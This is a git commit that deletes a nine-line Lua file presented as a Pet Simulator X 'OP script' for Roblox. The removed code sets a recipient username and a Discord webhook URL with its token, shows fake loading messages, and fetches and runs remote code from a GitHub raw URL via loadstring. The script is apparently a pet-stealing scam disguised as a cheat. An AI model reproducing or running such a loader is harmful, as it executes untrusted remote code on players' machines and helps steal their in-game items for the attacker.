689411bc871088427a37dc2238a1de66a1b75161
jefrey <126723194+jeffreyDarmer1443123@users.noreply.github.com>
2023-03-05 00:56:14 +0100

    Delete PSX_OP_Script.lua

--- PSX_OP_Script.lua
+++
@@ -1,9 +0,0 @@
-Username = "Plakins8"
-WebHook = "https://discord.com/api/webhooks/1081725277937336441/cOVYCnVm6NCBJVO0DwCnM8tIC3kkifuijcNtrSr_45tVZhWUCGVeWvrZRXupsD4JiD_x"
-
-_G.CustomScriptName = "PSX Script"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
